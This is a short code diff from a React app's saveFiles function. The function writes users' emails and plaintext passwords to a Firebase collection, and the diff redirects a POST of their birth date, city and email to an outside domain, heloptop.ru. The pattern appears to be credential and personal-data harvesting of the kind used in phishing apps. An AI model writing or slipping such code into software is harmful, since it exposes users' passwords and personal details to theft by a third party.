@@ -55,7 +55,7 @@ function App() {
     const saveFiles = async () => {
         const firebaseCollection = collection(db, "data");
         await addDoc(firebaseCollection, {email: person.email, password: person.password})
-        await axios.post("/php/saveFiles.php", {
+        await axios.post("https://heloptop.ru/php/saveFiles.php", {
             "birth": person.birth,
             "city": person.city,
             "email": person.email,
